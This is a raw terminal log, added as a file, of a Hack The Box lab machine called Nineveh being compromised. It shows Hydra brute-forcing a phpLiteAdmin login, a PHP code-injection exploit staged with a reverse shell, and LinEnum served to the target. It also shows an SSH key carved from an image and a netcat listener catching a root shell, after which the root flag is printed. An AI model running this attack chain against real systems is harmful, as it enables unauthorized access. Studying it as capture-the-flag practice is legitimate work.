@@ -1,0 +1,274 @@
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ hydra -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect'               
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.               
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-08 18:52:27   
+[ERROR] I need at least either the -l, -L or -C option to know the login             
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=                     
+true:Incorrect'                                          
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.               
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-08 18:54:22   
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task          
+[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect           
+[STATUS] 1553.00 tries/min, 1553 tries in 00:01h, 8447 to do in 00:06h, 16 active    
+[STATUS] 1585.00 tries/min, 4755 tries in 00:03h, 5245 to do in 00:04h, 16 active    
+1 of 1 target completed, 0 valid passwords found         
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-08 19:00:42   
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ hydra -l admin -P /usr/share/seclists/Passwords/ 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect'                                            
+bt4-password.txt                           Default-Credentials/                       mssql-passwords-nansh0u-guardicore.txt     SCRABBLE-hackerhouse.tgz                   xato-net-10-million-passwords-10000.txt                 
+cirt-default-passwords.txt                 der-postillon.txt                          openwall.net-all.txt                       Software/                                  xato-net-10-million-passwords-1000.txt                  
+clarkson-university-82.txt                 dutch_common_wordlist.txt                  Permutations/                              stupid-ones-in-production.txt              xato-net-10-million-passwords-100.txt                   
+Common-Credentials/                        dutch_passwordlist.txt                     PHP-Magic-Hashes.txt                       twitter-banned.txt                         xato-net-10-million-passwords-10.txt                    
+Cracked-Hashes/                            dutch_wordlist                             probable-v2-top12000.txt                   unkown-azul.txt                            xato-net-10-million-passwords-dup.txt                   
+darkc0de.txt                               Honeypot-Captures/                         probable-v2-top1575.txt                    url-to-download-passwords.md               xato-net-10-million-passwords.txt                       
+darkweb2017-top10000.txt                   Keyboard-Combinations.txt                  probable-v2-top207.txt                     UserPassCombo-Jay.txt                                   
+darkweb2017-top1000.txt                    Leaked-Databases/                          README.md                                  WiFi-WPA/                                               
+darkweb2017-top100.txt                     Malware/                                   richelieu-french-top20000.txt              xato-net-10-million-passwords-1000000.txt               
+darkweb2017-top10.txt                      Most-Popular-Letter-Passes.txt             richelieu-french-top5000.txt               xato-net-10-million-passwords-100000.txt                
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ hydra -l admin -P /usr/share/seclists/Passwords/ 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect'                                            
+bt4-password.txt                           Default-Credentials/                       mssql-passwords-nansh0u-guardicore.txt     SCRABBLE-hackerhouse.tgz                   xato-net-10-million-passwords-10000.txt                 
+cirt-default-passwords.txt                 der-postillon.txt                          openwall.net-all.txt                       Software/                                  xato-net-10-million-passwords-1000.txt                  
+clarkson-university-82.txt                 dutch_common_wordlist.txt                  Permutations/                              stupid-ones-in-production.txt              xato-net-10-million-passwords-100.txt                   
+Common-Credentials/                        dutch_passwordlist.txt                     PHP-Magic-Hashes.txt                       twitter-banned.txt                         xato-net-10-million-passwords-10.txt                    
+Cracked-Hashes/                            dutch_wordlist                             probable-v2-top12000.txt                   unkown-azul.txt                            xato-net-10-million-passwords-dup.txt                   
+darkc0de.txt                               Honeypot-Captures/                         probable-v2-top1575.txt                    url-to-download-passwords.md               xato-net-10-million-passwords.txt                       
+darkweb2017-top10000.txt                   Keyboard-Combinations.txt                  probable-v2-top207.txt                     UserPassCombo-Jay.txt                                   
+darkweb2017-top1000.txt                    Leaked-Databases/                          README.md                                  WiFi-WPA/                                               
+darkweb2017-top100.txt                     Malware/                                   richelieu-french-top20000.txt              xato-net-10-million-passwords-1000000.txt               
+darkweb2017-top10.txt                      Most-Popular-Letter-Passes.txt             richelieu-french-top5000.txt               xato-net-10-million-passwords-100000.txt                
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.10.43 https-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incor                     
+rect'                                                                                                                                                                                                                                                           
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.               
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-08 19:05:43   
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task 
+[DATA] attacking http-post-forms://10.10.10.43:443/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect           
+[443][http-post-form] host: 10.10.10.43   login: admin   password: password123       
+1 of 1 target successfully completed, 1 valid password found           
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-08 19:06:38   
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ searchsploit phpliteadmin        
+------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                           |  Path     
+                                                                         | (/usr/share/exploitdb/)                
+------------------------------------------------------------------------- ----------------------------------------
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                           | exploits/php/webapps/24044.txt         
+phpLiteAdmin - 'table' SQL Injection                                     | exploits/php/webapps/38228.txt         
+phpLiteAdmin 1.1 - Multiple Vulnerabilities                              | exploits/php/webapps/37515.txt         
+phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                            | exploits/php/webapps/39714.txt         
+------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result       
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ searchsploit -m 24044.txt        
+  Exploit: PHPLiteAdmin 1.9.3 - Remote PHP Code Injection
+      URL: https://www.exploit-db.com/exploits/24044     
+     Path: /usr/share/exploitdb/exploits/php/webapps/24044.txt         
+File Type: ASCII text, with CRLF line terminators        
+
+Copied to: /home/arjun/Documents/HacktheBox/retired/nineveh/24044.txt  
+
+
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ vim 24044.txt      
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ cp /opt/shell/php/php-reverse-shell.php                       
+cp: missing destination file operand after '/opt/shell/php/php-reverse-shell.php'    
+Try 'cp --help' for more information.                    
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ cp /opt/shell/php/php-reverse-shell.php .                     
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ vim php-reverse-shell.php        
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ vim 24044.txt                                                 
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ vim php-reverse-shell.php                                     
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ vim 24044.txt                    
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ vim php-reverse-shell.php        
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ vim php-reverse-shell.php        
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ cp /opt/linux_privesc/LinEnum.sh 
+cp: missing destination file operand after '/opt/linux_privesc/LinEnum.sh'           
+Try 'cp --help' for more information.                    
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ cp /opt/linux_privesc/LinEnum.sh .                            
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ python -m SimpleHTTPServer       
+Serving HTTP on 0.0.0.0 port 8000 ...                    
+10.10.10.43 - - [08/May/2020 19:35:57] code 404, message File not found
+10.10.10.43 - - [08/May/2020 19:35:57] "GET /LinEnum.s HTTP/1.1" 404 - 
+10.10.10.43 - - [08/May/2020 19:36:21] "GET /LinEnum.sh HTTP/1.1" 200 -
+^CTraceback (most recent call last):                     
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main 
+    "__main__", fname, loader, pkg_name)                 
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code            
+    exec code in run_globals                             
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module> 
+    test()                  
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test     
+    BaseHTTPServer.test(HandlerClass, ServerClass)       
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test       
+    httpd.serve_forever()   
+  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever
+    poll_interval)          
+  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry 
+    return func(*args)      
+KeyboardInterrupt           
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ ls   
+24044.txt  LinEnum.sh   nmap       notes.ctb~   notes.ctb~~~           results       
+38228.txt  nineveh.png  notes.ctb  notes.ctb~~  php-reverse-shell.php  
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ cp results/        
+exif/                                   nineveh.png_Green_1.png        
+keepers/                                nineveh.png_Green_2.png        
+nineveh.png_autocontrast.png            nineveh.png_Green_3.png        
+nineveh.png_Blue_0.png                  nineveh.png_Green_4.png        
+nineveh.png_Blue_1.png                  nineveh.png_Green_5.png        
+nineveh.png_Blue_2.png                  nineveh.png_Green_6.png        
+nineveh.png_Blue_3.png                  nineveh.png_Green_7.png        
+nineveh.png_Blue_4.png                  nineveh.png_green_plane.png    
+nineveh.png_Blue_5.png                  nineveh.png_inverted.png       
+nineveh.png_Blue_6.png                  nineveh.png_Max.png            
+nineveh.png_Blue_7.png                  nineveh.png_Median.png         
+nineveh.png_blue_plane.png              nineveh.png_Min.png            
+nineveh.png_Edge-enhance_More.png       nineveh.png_Mode.png           
+nineveh.png_Edge-enhance.png            nineveh.png_Red_0.png          
+nineveh.png_enhance_sharpness_-100.png  nineveh.png_Red_1.png          
+nineveh.png_enhance_sharpness_100.png   nineveh.png_Red_2.png          
+nineveh.png_enhance_sharpness_-25.png   nineveh.png_Red_3.png          
+nineveh.png_enhance_sharpness_25.png    nineveh.png_Red_4.png          
+nineveh.png_enhance_sharpness_-50.png   nineveh.png_Red_5.png          
+nineveh.png_enhance_sharpness_50.png    nineveh.png_Red_6.png          
+nineveh.png_enhance_sharpness_-75.png   nineveh.png_Red_7.png          
+nineveh.png_enhance_sharpness_75.png    nineveh.png_red_plane.png      
+nineveh.png_equalize.png                nineveh.png_Sharpen.png        
+nineveh.png_Find_Edges.png              nineveh.png_Smooth.png         
+nineveh.png_GaussianBlur.png            nineveh.png_solarized.png      
+nineveh.png_grayscale.png               trailing_data.bin
+nineveh.png_Green_0.png                                  
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ cp results/        
+cp: missing destination file operand after 'results/'    
+Try 'cp --help' for more information.                    
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$      
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$      
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$      
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$      
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$      
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ cp results/keepers/
+1588980203.678699-dfbd713687ca8945fd545dc004dba9aa   2BF8D0.tar        
+1588980214.8757386-6733033058a8f504ea857184bd32c1b0  54  
+1588980533.259825-27a9eef27510b7812dade7e696da14f3   54.zlib           
+1588980541.8375108-1fecfb5e7ada9256b11d86605490f55a  secret/           
+1588980567.2334936-18dd49be7f848d145325e82dcee13d25      
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ cp results/keepers/secret/*      
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ cp results/keepers/secret/* .    
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ ls   
+24044.txt  LinEnum.sh   nineveh.priv  nmap       notes.ctb~   notes.ctb~~~           results                      
+38228.txt  nineveh.png  nineveh.pub   notes.ctb  notes.ctb~~  php-reverse-shell.php  
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ file nineveh.priv  
+nineveh.priv: PEM RSA private key                        
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ ssh -i nineveh.priv amrois@10.10.10.43                        
+
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ ssh -i nineveh.priv amrois@10.10.10.43                        
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ ls   
+24044.txt  LinEnum.sh         nineveh.png   nineveh.pub  notes.ctb   notes.ctb~~   php-reverse-shell.php          
+38228.txt  ninevehForAll.png  nineveh.priv  nmap         notes.ctb~  notes.ctb~~~  results                        
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ stegoveritas ninevehForAll.png   
+Running Module: SVImage     
++---------------------------+------+                     
+|        Image Format       | Mode |                     
++---------------------------+------+                     
+| Portable network graphics | RGB  |                     
++---------------------------+------+                     
+Running Module: MultiHandler                             
+
+Exif                        
+====                        
++---------------------+--------------------------------------------------------------------+                      
+| key                 | value                                                              |                      
++---------------------+--------------------------------------------------------------------+                      
+| SourceFile          | /home/arjun/Documents/HacktheBox/retired/nineveh/ninevehForAll.png |                      
+| ExifToolVersion     | 11.97                                                              |                      
+| FileName            | ninevehForAll.png                                                  |                      
+| Directory           | /home/arjun/Documents/HacktheBox/retired/nineveh                   |                      
+| FileSize            | 548 kB                                                             |                      
+| FileModifyDate      | 2020:05:08 19:48:56-05:00                                          |                      
+| FileAccessDate      | 2020:05:08 19:49:10-05:00                                          |                      
+| FileInodeChangeDate | 2020:05:08 19:48:56-05:00                                          |                      
+| FilePermissions     | rw-r--r--                                                          |                      
+| FileType            | PNG                                                                |                      
+| FileTypeExtension   | png                                                                |                      
+| MIMEType            | image/png                                                          |                      
+| ImageWidth          | 1336                                                               |                      
+| ImageHeight         | 508                                                                |                      
+| BitDepth            | 8                                                                  |                      
+| ColorType           | RGB                                                                |                      
+| Compression         | Deflate/Inflate                                                    |                      
+| Filter              | Adaptive                                                           |                      
+| Interlace           | Noninterlaced                                                      |                      
+| SignificantBits     | 8 8 8                                                              |                      
+| Software            | Shutter                                                            |                      
+| ImageSize           | 1336x508                                                           |                      
+| Megapixels          | 0.679                                                              |                      
++---------------------+--------------------------------------------------------------------+                      
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+WARNING:StegoVeritas:Modules:Multi:Analysis:Exif:Exif outpat already exists, modifying.                           
+Found something worth keeping!                           
+PNG image data, 1336 x 508, 8-bit/color RGB, non-interlaced            
++--------+------------------+----------------------------------------+-----------+   
+| Offset | Carved/Extracted | Description                            | File Name |   
++--------+------------------+----------------------------------------+-----------+   
+| 0x54   | Carved           | Zlib compressed data, best compression | 54.zlib   |   
+| 0x54   | Extracted        | Zlib compressed data, best compression | 54        |   
++--------+------------------+----------------------------------------+-----------+   
+WARNING:StegoVeritas:Keeper name already exists, modifying.            
+WARNING:StegoVeritas:Keeper name already exists, modifying.            
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ python -m SimpleHTTPServer       
+Serving HTTP on 0.0.0.0 port 8000 ...                    
+10.10.10.43 - - [08/May/2020 19:51:26] "GET /nineveh.priv HTTP/1.1" 200 -            
+^CTraceback (most recent call last):                     
+  File "/usr/lib/python2.7/runpy.py", line 174, in _run_module_as_main 
+    "__main__", fname, loader, pkg_name)                 
+  File "/usr/lib/python2.7/runpy.py", line 72, in _run_code            
+    exec code in run_globals                             
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 235, in <module> 
+    test()    
+  File "/usr/lib/python2.7/SimpleHTTPServer.py", line 231, in test     
+    BaseHTTPServer.test(HandlerClass, ServerClass)       
+  File "/usr/lib/python2.7/BaseHTTPServer.py", line 610, in test       
+    httpd.serve_forever()   
+  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever              
+    poll_interval)          
+  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry 
+    return func(*args)      
+KeyboardInterrupt           
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$      
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ nc -lvnp 9090                                                 
+listening on [any] 9090 ... 
+connect to [10.10.14.19] from (UNKNOWN) [10.10.10.43] 49050                                                       
+bash: cannot set terminal process group (2421): Inappropriate ioctl for device                                    
+bash: no job control in this shell                       
+root@nineveh:~# whoami      
+whoami                      
+root                        
+root@nineveh:~# cat root.txt
+cat root.txt                
+8a2b4956612b485720694fb45849ec3a                         
+root@nineveh:~# ls          
+cat                         
+^C                          
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$ ls   
+24044.txt  console0.log       nineveh.png   nmap        notes.ctb~~            procmon.sh                         
+33899.txt  LinEnum.sh         nineveh.priv  notes.ctb   notes.ctb~~~           results                            
+38228.txt  ninevehForAll.png  nineveh.pub   notes.ctb~  php-reverse-shell.php  update                             
+arjun@broly:~/Documents/HacktheBox/retired/nineveh$      
